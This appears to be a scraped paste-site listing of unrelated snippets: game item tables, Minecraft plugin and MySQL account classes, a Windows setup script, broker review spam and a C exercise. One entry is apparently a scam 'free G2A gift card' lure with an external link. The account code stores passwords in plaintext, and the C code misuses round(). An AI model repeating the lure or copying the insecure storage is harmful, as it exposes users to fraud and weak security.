+	[""friesburgershot""]			    = {[""name""] = ""friesburgershot"", 			    [""label""] = ""Burgershot Fries"", 		[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""burgershotfries.png"", 		[""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""The Essence of Life.""},
+	[""nuggetsburgershot""]			= {[""name""] = ""nuggetsburgershot"", 				[""label""] = ""Burgershot Nuggets"", 		[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""nuggets.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""Deliciously infectious!""},
+	[""bleeder""]			 		    = {[""name""] = ""bleeder"", 					    [""label""] = ""The Bleeder"", 				[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""single.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""The Essence of Life.""},
+	[""heartstopper""]			 	= {[""name""] = ""heartstopper"", 					[""label""] = ""Heart Stopper"", 			[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""double.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""Deliciously infectious!""},
+	[""roosterbooster""]			 	= {[""name""] = ""roosterbooster"", 				[""label""] = ""The Rooster Booster"", 		[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""chicken.png"", 			    [""unique""] = false, 		[""useable""] = true, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""Deliciously infectious!""},
+
+	-- ingredients
+	[""potatoes""]			 		= {[""name""] = ""potatoes"", 						[""label""] = ""Potatoes"", 				[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""potatoes.png"", 			[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""I'm sure you need to fry this.""},
+	[""cookingoil""]			 		= {[""name""] = ""cookingoil"", 					[""label""] = ""Cooking Oil"", 				[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""cookingoil.png"", 			[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""This helps with frying.""},
+	[""chicken""]			 			= {[""name""] = ""chicken"", 						[""label""] = ""Chicken"", 					[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""chicken.png"", 				[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""I think you need to cook this.""},
+	[""patty""]			 			= {[""name""] = ""patty"", 							[""label""] = ""Patty"", 					[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""patty.png"", 				[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""I think you need to cook this.""},
+	[""buns""]			 			= {[""name""] = ""buns"", 							[""label""] = ""Buns"", 					[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""buns.png"", 				[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""This is great with a burger.""},
+	[""lettuce""]			 			= {[""name""] = ""lettuce"", 						[""label""] = ""Lettuce"", 					[""weight""] = 100, 	[""type""] = ""item"", 		[""image""] = ""lettuce.png"", 				[""unique""] = false, 		[""useable""] = false, 	[""shouldClose""] = false,   [""combinable""] = nil,   [""description""] = ""This is great with a burger.""},"
+G2vY5fZD,Untitled,Elrol,JSON,Monday 24th of June 2024 10:52:59 AM CDT,"[
+  {
+    ""text"": ""Active hosts are: %hosts%"",
+    ""weight"": 1
+  }
+]"
+SAXXGK8T,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🎁,portalxwe,GetText,Monday 24th of June 2024 10:51:54 AM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+
+This is the most up to date version of this script. Any other one posted will not work.
+ 
+PDF guide here:
+https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
+
+Working as of:
+24 June 2024"
+pvWwnK3M,Format,joshy23,Java,Monday 24th of June 2024 10:49:31 AM CDT,"package gc.morodo.format;
+
+import org.bukkit.configuration.MemoryConfiguration;
+import org.bukkit.configuration.serialization.ConfigurationSerializable;
+import org.bukkit.configuration.serialization.SerializableAs;
+
+import java.util.Collections;
+import java.util.LinkedHashMap;
+import java.util.Map;
+
+/**
+ * @author joshy56
+ * @since 23/6/2024
+ */
+@SerializableAs(""Format"")
+public class Format implements ConfigurationSerializable {
+    private String prefix, name;
+
+    public Format(String name) {
+        setName(name);
+    }
+
+    private Format() {
+    }
+
+    public Format setPrefix(String prefix) {
+        if(prefix == null || prefix.isBlank()) throw new IllegalArgumentException(""Prefix nulo o vacio."");
+        this.prefix = prefix;
+        return this;
+    }
+
+    public String getPrefix() {
+        return prefix;
+    }
+
+    public Format setName(String name) {
+        if(name == null || name.isBlank()) throw new IllegalArgumentException(""Nombre nulo o vacio."");
+        this.name = name;
+        return this;
+    }
+
+    public String getName() {
+        return name;
+    }
+
+    public static Format deserialize(Map<String, Object> formatData) {
+        if(formatData.isEmpty()) throw new IllegalArgumentException(""Formato o grupo nulo, no contiene datos para deserializar."");
+        MemoryConfiguration tempConfig = new MemoryConfiguration();
+        for (Map.Entry<String, Object> entry : formatData.entrySet()) {
+            tempConfig.set(entry.getKey(), entry.getValue());
+        }
+
+        String name = tempConfig.getName(), prefix = tempConfig.getString(name + "".prefix"");
+        if(prefix == null || prefix.isBlank()) throw new IllegalArgumentException(""Formato o grupo invalido, no contiene el dato 'prefix'."");
+
+        Format format = new Format();
+        format.setName(name);
+        format.setPrefix(prefix);
+        return format;
+    }
+
+    /**
+     * Creates a Map representation of this class.
+     * <p>
+     * This class must provide a method to restore this class, as defined in
+     * the {@link ConfigurationSerializable} interface javadocs.
+     *
+     * @return Map containing the current state of this class
+     */
+    @Override
+    public Map<String, Object> serialize() {
+        Map<String, Object> data = new LinkedHashMap<>(1);
+        data.put(""prefix"", getPrefix());
+        return Collections.singletonMap(getName(), data);
+    }
+}
+"
+fsg8TK1F,FormatsConfig,joshy23,Java,Monday 24th of June 2024 10:48:37 AM CDT,"package gc.morodo.configs;
+
+import com.google.common.io.Files;
+import org.bukkit.configuration.Configuration;
+import org.bukkit.configuration.InvalidConfigurationException;
+import org.bukkit.configuration.file.YamlConfiguration;
+import org.bukkit.plugin.Plugin;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
+import java.util.logging.Level;
+
+/**
+ * @author joshy56
+ * @since 23/6/2024
+ */
+public class FormatsConfig extends YamlConfiguration {
+    private final File fileConfiguration;
+    private final Plugin plugin;
+
+    public FormatsConfig(String fileName, String folderPath, Plugin plugin) {
+        this.plugin = plugin;
+        File parent = concatFile(plugin.getDataFolder(), folderPath);
+        fileConfiguration = concatFile(parent, fileName);
+        reload();
+    }
+
+    protected File concatFile(File parent, String child) {
+        try {
+            if(child == null || child.isBlank()) throw new IllegalArgumentException(""Nombre de archivo nulo o vacio."");
+            Files.createParentDirs(parent);
+            return new File(parent, child);
+        } catch (IOException e) {
+            plugin.getLogger().log(Level.SEVERE, ""Ocurrio un problema creando el archivo."");
+        } catch (IllegalArgumentException e) {
+            plugin.getLogger().log(Level.SEVERE, ""Nombre de archivo nulo o vacio."");
+        }
+        return null;
+    }
+
+    public void reload() {
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(plugin.getResource(fileConfiguration.getName()), StandardCharsets.UTF_8))) {
+            Configuration defConf = YamlConfiguration.loadConfiguration(reader);
+            if(fileConfiguration.exists()) {
+                load(fileConfiguration);
+                setDefaults(defConf);
+            } else {
+                load(reader);
+            }
+        } catch (IOException e) {
+            plugin.getLogger().log(Level.SEVERE, ""Ocurrio un problema cargando el archivo '"" + fileConfiguration.getName() + ""'."", e);
+        } catch (InvalidConfigurationException e) {
+            plugin.getLogger().log(Level.WARNING, ""Archivo de configuracion '"" + fileConfiguration.getName() + ""' invalido."", e);
+        }
+    }
+
+    public void save() {
+        try {
+            save(fileConfiguration);
+        } catch (IOException e) {
+            plugin.getLogger().log(Level.SEVERE, ""Ocurrio un problema guardando el archivo '"" + fileConfiguration.getName() + ""'."", e);
+        }
+    }
+}
+"
+hHxbHQSE,MainFormats,joshy23,Java,Monday 24th of June 2024 10:42:21 AM CDT,"package gc.morodo.configs;
+
+import gc.morodo.GrandChat;
+
+/**
+ * @author joshy56
+ * @since 23/6/2024
+ */
+public class MainFormats {
+    private FormatsConfig formatsConfig;
+    private final GrandChat plugin;
+
+    public MainFormats(GrandChat plugin) {
+        this.plugin = plugin;
+        reloadConfig();
+    }
+
+    public void loadConfig() {
+        if(formatsConfig == null) {
+            formatsConfig = new FormatsConfig(""Formats.yml"", null, plugin);
+        }
+    }
+
+    public void reloadConfig() {
+        formatsConfig.reload();
+        loadConfig();
+    }
+
+    public String getPrefix(String name) {
+        if(formatsConfig.contains(""Formats."" + name + "".prefix""))
+            return formatsConfig.getString(""Formats."" + name + "".prefix"");
+        return """";
+    }
+}
+"
+qH8j8xk7,GrandChatMain,joshy23,Java,Monday 24th of June 2024 10:40:52 AM CDT,"package gc.morodo;
+
+import gc.morodo.format.Format;
+import org.bukkit.configuration.serialization.ConfigurationSerialization;
+import org.bukkit.plugin.java.JavaPlugin;
+
+/**
+ * @author joshy56
+ * @since 23/6/2024
+ */
+public class GrandChat extends JavaPlugin {
+    @Override
+    public void onLoad() {
+        ConfigurationSerialization.registerClass(Format.class);
+    }
+
+    @Override
+    public void onDisable() {
+        ConfigurationSerialization.unregisterClass(Format.class);
+    }
+}
+"
+QmZqcdVQ,MySQL in dart,Genral,Dart,Monday 24th of June 2024 10:37:56 AM CDT,"import 'package:mysql1/mysql1.dart';
+import 'dart:async';
+
+enum AccountState {
+  DoesntExist,
+  Banned,
+  User,
+  Conter,
+  ProjectManager,
+  RegionalDirector,
+  RegionalManager,
+  Assistant
+}
+
+class Account {
+  String username;
+  String password;
+  String mobile;
+  String email;
+  String fullName;
+  DateTime lastCheck;
+  AccountState state;
+  int uid;
+  List<int> imageBytes;
+
+  Account({
+    this.username = '',
+    this.password = '',
+    this.mobile = '',
+    this.email = '',
+    this.fullName = '',
+    this.lastCheck,
+    this.state = AccountState.DoesntExist,
+    this.uid = 0,
+    this.imageBytes,
+  });
+}
+
+//------------------------------------------------
+
+import 'package:mysql1/mysql1.dart';
+import 'account.dart';
+import 'dart:async';
+
+class Accounts {
+  Accounts();
+
+  Future<void> dbWhere(String user, Account acc) async {
+    if (user == null) return;
+    clearAccount(acc);
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.select);
+      cmd.select('accounts').where('Username', user);
+      final results = await cmd.query(conn);
+
+      for (var row in results) {
+        acc.uid = row['id'];
+        acc.username = row['Username'];
+        acc.password = row['Password'];
+        acc.mobile = row['Mobile'];
+        acc.email = row['Email'];
+        acc.fullName = row['Full_Name'];
+        acc.lastCheck = row['LastCheck'];
+        acc.state = AccountState.values[row['State']];
+        acc.imageBytes = row['image_profile'];
+      }
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  Future<void> dbWhereById(int uid, Account acc) async {
+    if (uid == 0) return;
+    clearAccount(acc);
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.select);
+      cmd.select('accounts').where('id', uid);
+      final results = await cmd.query(conn);
+
+      for (var row in results) {
+        acc.uid = row['id'];
+        acc.username = row['Username'];
+        acc.password = row['Password'];
+        acc.mobile = row['Mobile'];
+        acc.email = row['Email'];
+        acc.fullName = row['Full_Name'];
+        acc.lastCheck = row['LastCheck'];
+        acc.state = AccountState.values[row['State']];
+        acc.imageBytes = row['image_profile'];
+      }
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  Future<void> lastLogin(Account acc) async {
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.update);
+      final formattedDate = DateTime.now().toString();
+      cmd.update('accounts')
+          .set('LastCheck', formattedDate)
+          .where('Username', acc.username);
+      await cmd.execute(conn);
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  Future<void> updateUserAdd(int id, Account acc) async {
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.update);
+      cmd.update('accounts')
+          .set('Password', acc.password)
+          .set('Full_Name', acc.fullName)
+          .set('Mobile', acc.mobile)
+          .set('Email', acc.email)
+          .set('State', acc.state.index)
+          .set('image_profile', acc.imageBytes)
+          .where('id', id);
+      await cmd.execute(conn);
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  Future<void> insertUserAdd(Account acc) async {
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.insert);
+      cmd.insert('accounts')
+          .insertField('Username', acc.username)
+          .insertField('Password', acc.password)
+          .insertField('Mobile', acc.mobile)
+          .insertField('Email', acc.email)
+          .insertField('State', acc.state.index.toString())
+          .insertField('Full_Name', acc.fullName)
+          .insertField('image_profile', acc.imageBytes);
+      await cmd.execute(conn);
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  Future<void> delete(int id) async {
+    try {
+      final conn = await getConnection();
+      final cmd = MySqlCommand(MySqlCommandType.delete);
+      cmd.delete('accounts', 'id', id);
+      await cmd.execute(conn);
+      await conn.close();
+    } catch (e) {
+      print('Error: $e');
+    }
+  }
+
+  void clearAccount(Account acc) {
+    acc.username = '';
+    acc.password = '';
+    acc.mobile = '';
+    acc.email = '';
+    acc.fullName = '';
+    acc.lastCheck = DateTime.now();
+    acc.state = AccountState.DoesntExist;
+    acc.uid = 0;
+    acc.imageBytes = [];
+  }
+}
+"
+jAcvmEYE,AccountsDb,Genral,C#,Monday 24th of June 2024 10:26:12 AM CDT,"using System;
+using AmirSQL.MySQL;
+using System.Windows.Forms;
+using System.Threading.Tasks;
+
+namespace Sinaa_Project.Database
+{
+    public class Account
+    {
+        public enum AccountState : byte
+        {
+            DoesntExist = 0,
+            Banned = 1,
+            User = 2,
+            conter = 3,
+            ProjectManager = 4,
+            RegionalDirector = 5,
+            RegionalManager = 6,
+            Assistant = 7
+        }
+        
+        public string Username { get; set; }
+        public string Password { get; set; }
+        public string Mobile { get; set; }
+        public string Email { get; set; }
+        public string Full_Name { get; set; }
+        public DateTime LastCheck { get; set; }
+        public AccountState State { get; set; }
+        public int UID { get; set; }
+        public byte[] ImageBytes { get; set; }
+    }
+    public class Accounts
+    {
+        public Accounts()
+        {
+
+        }
+        public async Task DB_Where(string user, Account acc)
+        {
+            if (user == null) return;
+            ClearAccount(acc);
+            try
+            {
+                using (var cmd = new MySqlCommand(MySqlCommandType.SELECT))
+                {
+                    cmd.Select(""accounts"").Where(""Username"", user);
+                    using (var reader = await cmd.CreateReaderAsync())
+                    {
+                        while (reader.Read())
+                        {
+                            acc.UID = reader.Read<int>(""id"");
+                            acc.Username = reader.Read<string>(""Username"");
+                            acc.Password = reader.Read<string>(""Password"");
+                            acc.Mobile = reader.Read<string>(""Mobile"");
+                            acc.Email = reader.Read<string>(""Email"");
+                            acc.Full_Name = reader.Read<string>(""Full_Name"");
+                            acc.LastCheck = reader.Read<DateTime>(""LastCheck"");
+                            acc.State = (Account.AccountState)reader.Read<int>(""State"");
+                            acc.ImageBytes = reader.Read<byte[]>(""image_profile"");
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.SaveException(ex);
+                MessageBox.Show(""Error : "" + ex.Message + ""\nStackTrace: "" + ex.StackTrace);
+            }
+        }
+
+        public async Task DB_Where(int uid, Account acc)
+        {
+            if (uid == 0) return;
+            ClearAccount(acc);
+            try
+            {
+                using (var cmd = new MySqlCommand(MySqlCommandType.SELECT))
+                {
+                    cmd.Select(""accounts"").Where(""id"", uid);
+                    using (var reader = await cmd.CreateReaderAsync())
+                    {
+                        while (reader.Read())
+                        {
+                            acc.UID = reader.Read<int>(""id"");
+                            acc.Username = reader.Read<string>(""Username"");
+                            acc.Password = reader.Read<string>(""Password"");
+                            acc.Mobile = reader.Read<string>(""Mobile"");
+                            acc.Email = reader.Read<string>(""Email"");
+                            acc.Full_Name = reader.Read<string>(""Full_Name"");
+                            acc.LastCheck = reader.Read<DateTime>(""LastCheck"");
+                            acc.State = (Account.AccountState)reader.Read<int>(""State"");
+                            acc.ImageBytes = reader.Read<byte[]>(""image_profile"");
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.SaveException(ex);
+                MessageBox.Show(""Error : "" + ex.Message);
+            }
+        }
+        public async Task Last_Login(Account acc)
+        {
+            try
+            {
+                using (var cmd = new MySqlCommand(MySqlCommandType.UPDATE))
+                {
+                    string formattedDate = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss"");
+                    cmd.Update(""accounts"")
+                       .Set(""LastCheck"", formattedDate)
+                       .Where(""Username"", acc.Username);
+                       await cmd.ExecuteAsync();
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.SaveException(ex);
+                MessageBox.Show(""حدث خطأ أثناء تحديث آخر تسجيل دخول: "" + ex.Message);
+            }
+        }
+        public async Task Update_UserAdd(int id, Account acc)
+        {
+            try
+            {
+                using (var cmd = new MySqlCommand(MySqlCommandType.UPDATE))
+                {
+                    cmd.Update(""accounts"")
+                        .Set(""Password"", acc.Password)
+                        .Set(""Full_Name"", acc.Full_Name)
+                        .Set(""Mobile"", acc.Mobile)
+                        .Set(""Email"", acc.Email)
+                        .Set(""State"", acc.State)
+                        .Set(""image_profile"", acc.ImageBytes)
+                        .Where(""id"", id);
+                    await cmd.ExecuteAsync();
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.SaveException(ex);
+                MessageBox.Show(""حدث خطأ أثناء استبدال الصورة في قاعدة البيانات: "" + ex.Message);
+            }
+        }
+        public async Task Insert_UserAdd(Account acc)
+        {
+            try
+            {
+                using (var cmd = new MySqlCommand(MySqlCommandType.INSERT))
+                {
+                    cmd.Insert(""accounts"")
+                        .Insert(""Username"", acc.Username)
+                        .Insert(""Password"", acc.Password)
+                        .Insert(""Mobile"", acc.Mobile)
+                        .Insert(""Email"", acc.Email)
+                        .Insert(""State"", acc.State.ToString(""d""))
+                        .Insert(""Full_Name"", acc.Full_Name)
+                        .Insert(""image_profile"", acc.ImageBytes);
+                    await cmd.ExecuteAsync();
+                }
+            }
+            catch (Exception ex)
+            {
+                Program.SaveException(ex);
+                MessageBox.Show(""حدث خطأ أثناء اضافة الصورة في قاعدة البيانات: "" + ex.Message);
+            }
+        }
+        public async Task delete(int id)
+        {
+            using (var cmd = new MySqlCommand(MySqlCommandType.DELETE))
+            {
+                cmd.Delete(""accounts"", ""id"", id);
+                await cmd.ExecuteAsync();
+            }
+        }
+        private void ClearAccount(Account acc)
+        {
+            acc.Username = """";
+            acc.Password = """";
+            acc.Mobile = """";
+            acc.Email = """";
+            acc.Full_Name = """";
+            acc.LastCheck = DateTime.Now;
+            acc.State = Account.AccountState.DoesntExist;
+            acc.UID = 0;
+            acc.ImageBytes = new byte[0];
+        }
+    }
+}
+
+"
+dPcdMe4L,boxstarter-sm,Lynngineer,PowerShell,Monday 24th of June 2024 10:23:10 AM CDT,"# Description: Boxstarter Script for Windows 10 miscellaneous admin machine
+# boxstarter-sm
+# 2024-06-24: Some settings and autohotkey
+ 
+Disable-UAC
+Disable-BingSearch
+ 
+#--- Windows Features ---
+Set-WindowsExplorerOptions -EnableShowHiddenFilesFoldersDrives -EnableShowProtectedOSFiles -EnableShowFileExtensions -EnableShowFullPathInTitleBar -DisableOpenFileExplorerToQuickAccess -DisableShowRecentFilesInQuickAccess -DisableShowFrequentFoldersInQuickAccess -EnableExpandToOpenFolder -DisableShowRibbon -DisableItemCheckBox
+ 
+#--- tools ---
+choco install -y autohotkey.install		# ""autohotkey.install"" is v1. ""autohotkey"" is v2.
+ 
+ 
+#--- Fonts ---
+#choco install -y inconsolata
+#choco install -y ubuntu.font
+ 
+ 
+#--- VS Code ---
+choco install -y vscode
+ 
+#--- VS Code extensions ---
+#choco install -y vscode-docker
+ 
+Enable-UAC"
+jQW93U5C,Review Rock Global,fxvnpro,PHP,Monday 24th of June 2024 10:06:31 AM CDT,"https://www.fxvnpro.com/review-rock-global/
+ 
+Established by a sophisticated and experienced team of trading experts, Rockfort Markets Ltd (trading as “Rock Global”) has a New Zealand Derivative Issuer license. We also have extensive connections with brokers and investment banks around the world.
+
+
+
+Our highly secure platform – combined with the latest technology and lowest latency creates a powerful, personalised service for your individual trading requirements.
+
+
+
+At RockGlobal we make sure we are compliant and up-to-date with the latest regulations and undertakes external audits using experienced audit firms. We make no compromise when it comes tour offering, utilising the most up-to-date platform technology so you can enjoy the most convenient trading experience around.
+
+
+
+Whether you are a first time investor or an active trader, RockGlobal can service your requirements. Our team of account managers are just a phone call away to service any support queries you may have.
+
+
+
+Broker Logo &nbsp;
+
+
+
+BROKER INFORMATION
+
+
+
+Broker TypeSTPCompanyRockfort Markets LimitedFoundation2015CountryNew ZealandRegulation- Rockfort Markets Limited (trading as “RockGlobal”) is a company registered inNew Zealand&nbsp;(NZBN 9429042010807)- RockGlobal is a registered Financial Service Provider&nbsp;(FSP509766)&nbsp;and holdsa Derivative Issuer Licence issued by the Financial Markets Authority.Minimum Initial Deposit$200Account Base CurrenciesUSD, EURAccount Deposit MethodsWire Transfer, POLi, Visa or Mastercard*** Global Markets keeps all client funds separate from our operating expenses.Funds received by our clients are held in segregated accounts at ANZ Bank.Account Withdrawal MethodsNewZealand Bank Account, International Bank AccountLive ChatNoEmailinfo@rockglobal.co.nzCall+64 9 281 2012
+
+
+
+ADVANTAGES
+
+
+
+Free Demo AccountYesSpreadsFrom 0.0 pipsExecution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeNoPromotionsNoVirtual Private ServerNoTrading Platforms&nbsp;MetaTrader 4, Trader WorkstationScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Shares, Options, ETFs, Futures, Options, CFDs 
+
+
+
+DISADVANTAGES
+
+
+
+RestrictionsRockfort Markets will not take clients from the following countries: Cuba; Iran; Laos; Mozambique;Myanmar (Burma); North Korea; Sudan; Syria; Russia; Belarus. – For regulation reasons, we will also nottake clients from China (Mainland) and The United States of America.
+"
+0uxny4Cp,Review Rock Global,reviewbrokers,PHP,Monday 24th of June 2024 10:06:28 AM CDT,"https://www.reviewbrokers.net/review-rock-global/
+ 
+Established by a sophisticated and experienced team of trading experts, Rockfort Markets Ltd (trading as “Rock Global”) has a New Zealand Derivative Issuer license. We also have extensive connections with brokers and investment banks around the world.
+
+
+
+Our highly secure platform – combined with the latest technology and lowest latency creates a powerful, personalised service for your individual trading requirements.
+
+
+
+At RockGlobal we make sure we are compliant and up-to-date with the latest regulations and undertakes external audits using experienced audit firms. We make no compromise when it comes tour offering, utilising the most up-to-date platform technology so you can enjoy the most convenient trading experience around.
+
+
+
+Whether you are a first time investor or an active trader, RockGlobal can service your requirements. Our team of account managers are just a phone call away to service any support queries you may have.
+
+
+
+Broker Logo &nbsp;
+
+
+
+
+
+
+
+Broker TypeSTPCompanyRockfort Markets LimitedFoundation2015CountryNew ZealandRegulation- Rockfort Markets Limited (trading as “RockGlobal”) is a company registered inNew Zealand&nbsp;(NZBN 9429042010807)- RockGlobal is a registered Financial Service Provider&nbsp;(FSP509766)&nbsp;and holdsa Derivative Issuer Licence issued by the Financial Markets Authority.The JurisdictionsRockfort Markets will not take clients from the following countries: Cuba; Iran; Laos; Mozambique;Myanmar (Burma); North Korea; Sudan; Syria; Russia; Belarus. – For regulation reasons, we will also nottake clients from China (Mainland) and The United States of America.Live ChatNoEmailGeneral Enquiries: info@rockglobal.co.nzSpecific Enquries: compliance@rockglobal.co.nzCall+64 9 281 2012
+
+
+
+
+
+
+
+Free Demo AccountsYesMinimum Initial Deposit$200Multi-Currency AccountUSD, EUR, GBPSpreadsFrom 0.0 pipsIntroducing Brokers ProgramYesSwap FreeNoPromotionsNoVirtual Private ServerNoTrading Platforms&nbsp;MetaTrader 4, Trader WorkstationScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsWire Transfer, POLi, Visa or Mastercard*** Global Markets keeps all client funds separate from our operating expenses.Funds received by our clients are held in segregated accounts at ANZ Bank.
+"
+891Z54vw,Untitled,BorisKotlyar,C#,Monday 24th of June 2024 09:56:16 AM CDT,"using System;
+using System.Collections.Generic;
+using System.Linq;
+using ModelService;
+using StateMachineService;
+using UnityEngine;
+
+namespace Game
+{
+    public class MainScreenGameState : State
+    {
+        private readonly IModelStorage _modelStorage;
+
+        public MainScreenGameState(IModelStorage modelStorage)
+        {
+            _modelStorage = modelStorage;
+        }
+
+        public override void Enter()
+        {
+            var models = _modelStorage.GetStorage<DeckModel>().GetAll();
+            Shuffle(models, GetUniqueSeed());
+
+            var copyList = models.ToList();
+            
+            var card = copyList[0];
+            copyList.RemoveAt(0);
+
+            foreach (var model in models) 
+            {
+                Debug.Log($""id: {model.Id} power: {model.Power} suit: {model.Suit}"");
+            }
+        }
+
+        public override void Exit()
+        {
+        }
+
+        private int GetUniqueSeed()
+        {
+            return Guid.NewGuid().GetHashCode();
+        }
+        
+        private void Shuffle<T>(IList<T> list, int seed)
+        {
+            var rand = new System.Random(seed);
+            var n = list.Count;
+            while (n > 1)
+            {
+                n--;
+                var k = rand.Next(n + 1);
+                (list[k], list[n]) = (list[n], list[k]);
+            }
+        }
+    }
+}"
+9MevzD9u,Exercise 27,ChrillePan,C,Monday 24th of June 2024 09:48:05 AM CDT,"#include <stdio.h>
+#include <conio.h>
+#define _USE_MATH_DEFINES
+#include <math.h>
+
+int main(void) {
+
+  //Variables
+  double U, R, R_L, P_R, x; //User input
+  double R_2, U_2, P; //Saved calculations
+  int loop_check, button; //Needed for the do while loop
+
+  //Set variables
+  loop_check = 1; //Requirement to ensure the do loop is functioning
+
+  //Headline
+  printf(""Voltage divider for direct voltage\n"");
+  printf(""----------------------------------------------------------\n\n"");
+
+  //User requests
+  do {
+    printf(""Input voltage:                         (in V) : U   = "");
+    scanf_s(""%lf"", &U);
+    fseek(stdin, 0, SEEK_END);
+
+    printf(""Partial resistance:                  (in Ohm) : R   = "");
+    scanf_s(""%lf"", &R);
+    fseek(stdin, 0, SEEK_END);
+
+    printf(""Load resistance:                     (in Ohm) : R_L = "");
+    scanf_s(""%lf"", &R_L);
+    fseek(stdin, 0, SEEK_END);
+
+    printf(""Power rating:                          (in W) : P_R = "");
+    scanf_s(""%lf"", &P_R);
+    fseek(stdin, 0, SEEK_END);
+
+    printf(""Potentiometer setting:          (0 <= x <= 1) : x   = "");
+    scanf_s(""%lf"", &x);
+    fseek(stdin, 0, SEEK_END);
+
+    if (x <= 1. && x >= 0.) {
+      //Output
+      printf(""\n----------------------------------------------------------\n"");
+
+      R_2 = R * x;  //x = R_2/R --> R_2 = R * x
+      printf(""\nR_2 = %.1lf Ohm\n"", round(R_2, 1));
+
+      U_2 = (x * U) / (1 + (x - pow(x, 2)) * (R / R_L));   //U_2 = (x * U) / (1 + (x - pow(x, 2)) * (R / R_L)) //If we need U_2 later, we can define it ahead of the printf
+      printf(""U_2 = %.1lf V\n"", round(U_2, 1));
+
+      P = pow(U_2, 2) / R_L; //P = U^2_2 / R_L //It makes sense to buffer it before, because 1) we need it to calculate the percentage and 2) for the if loop
+
+      if (P <= P_R)
+        printf(""P   = %.1lf W            ( = %.1lf%% of the power rating )"", P, (P / P_R) * 100);
+      else {
+        printf(""ATTENTION: Overload!\n"");
+        printf(""P   = %.1lf W            ( %.1lf%% overload )"", P, ((P / P_R) * 100) - 100);
+      }
+
+      printf(""\n\n----------------------------------------------------------\n"");
+      printf(""\nDo you want to start from beginning? Y/N? ""); //User request to start from the beginning
+
+      button = _getch();
+      if (button == 'Y' || button == 'y') 
+        printf(""\n\n----------------------------------------------------------\n\n"");
+      else
+        loop_check = 0; //Set loop_check to 0 to leave the loop
+    }
+    else { //Program restarts due to false user input
+      printf(""\n----------------------------------------------------------\n\n"");
+      printf(""The value of x must be between 0 and 1\n"");
+      printf(""Program is starting from the beginning due to false user input\n"");
+      printf(""\n----------------------------------------------------------\n\n"");
+    }
+  } while (loop_check == 1);
+  return 0; //Exit the programm with no error
+}"
+wfB2PiTN,"""Activate GNSS"" rev_64",pleasedontcode,Arduino,Monday 24th of June 2024 09:37:26 AM CDT,"/********* Pleasedontcode.com **********
+
+	Pleasedontcode thanks you for automatic code generation! Enjoy your code!
+
+	- Terms and Conditions:
+	You have a non-exclusive, revocable, worldwide, royalty-free license
+	for personal and commercial use. Attribution is optional; modifications
+	are allowed, but you're responsible for code maintenance. We're not
+	liable for any loss or damage. For full terms,
+	please visit pleasedontcode.com/termsandconditions.
+
+	- Project: ""Activate GNSS""
+	- Source Code NOT compiled for: ESP32 DevKit V1
+	- Source Code created on: 2024-06-24 14:36:28
+
+********* Pleasedontcode.com **********/
+
+/****** SYSTEM REQUIREMENTS *****/
+/****** SYSTEM REQUIREMENT 1 *****/
+	/* Use TinyGSM library to initialize modem with APN */
+	/* ""airtelgprs.com"", establish GSM connection, enable */
+	/* GNSS module for location data capture, and display */
+	/* all activity logs on Serial Monitor. */
+/****** SYSTEM REQUIREMENT 2 *****/
+	/* add #define TINY_GSM_MODEM_SIM7600 */
+/****** END SYSTEM REQUIREMENTS *****/
+
+/****** DEFINITION OF LIBRARIES *****/
+#include <TinyGsmClient.h>
+
